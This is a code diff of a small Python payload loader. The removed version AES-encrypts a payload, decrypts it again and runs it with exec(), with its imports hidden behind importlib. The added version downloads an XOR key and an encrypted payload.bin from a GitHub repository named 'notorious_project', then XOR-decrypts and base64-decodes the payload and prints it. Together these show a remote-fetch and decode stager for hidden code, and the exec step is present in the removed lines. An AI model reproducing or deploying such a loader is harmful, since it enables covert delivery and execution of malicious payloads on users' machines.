@@ -1,35 +1,20 @@
-def importing():
-    import importlib
-    global AES, get_random_bytes, base64
-    aes_module = importlib.import_module("Crypto.Cipher.AES")
-    AES = aes_module  # AES.new(...) kullanılacak
-    random_module = importlib.import_module("Crypto.Random")
-    get_random_bytes = getattr(random_module, "get_random_bytes")
-    base64 = importlib.import_module("base64")
+import base64
+import requests
 
-def encrypt_payload(payload, key):
-    cipher = AES.new(key, AES.MODE_GCM)
-    ciphertext, tag = cipher.encrypt_and_digest(payload)
-    encrypted = base64.b64encode(cipher.nonce + tag + ciphertext)
-    return encrypted
+url_keys = "https://raw.githubusercontent.com/utkuberkaytan/notorious_project/refs/heads/main/keys"
+url_payload = "https://raw.githubusercontent.com/utkuberkaytan/notorious_project/refs/heads/main/payload.bin"
 
-def decrypt_payload(encrypted_payload, key):
-    data = base64.b64decode(encrypted_payload)
-    nonce = data[:16]
-    tag = data[16:32]
-    ciphertext = data[32:]
-    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
-    payload = cipher.decrypt_and_verify(ciphertext, tag)
-    return payload
+res_keys = requests.get(url_keys)
+lines = res_keys.text.strip().split("\n")
+xor_key = lines[0].strip().encode()
 
-importing()
-key = get_random_bytes(16)
-payload = b"print('Hello World')"
+res_payload = requests.get(url_payload)
+encrypted = res_payload.content
 
-encrypted_payload = encrypt_payload(payload, key)
-print("Encrypted:", encrypted_payload)
+def xor_decrypt(data: bytes, key: bytes) -> bytes:
+    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
 
-decrypted_payload = decrypt_payload(encrypted_payload, key)
-print("Decrypted:", decrypted_payload.decode())
+decrypted_xor = xor_decrypt(encrypted, xor_key)
+decrypted_payload = base64.b64decode(decrypted_xor)
 
-exec(decrypted_payload.decode())
+print(decrypted_payload.decode())
